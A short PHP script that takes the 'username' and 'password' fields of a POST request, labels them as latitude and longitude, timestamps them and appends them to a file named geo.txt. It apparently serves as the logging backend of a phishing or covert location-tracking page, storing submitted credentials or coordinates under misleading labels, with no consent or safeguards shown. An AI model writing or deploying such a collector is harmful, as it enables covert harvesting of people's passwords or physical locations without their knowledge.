<?php





 @$time=date('Y-m-d H:i:s',time());
 $nowLatitude="纬度 ".$_POST['username'];
 $nowlongitude="经度 ".$_POST['password']."   ------时间是".$time."\r\n";;
 $fp=fopen("geo.txt", "a+");
 fwrite($fp, $nowLatitude);
 fwrite($fp, $nowlongitude);


?>

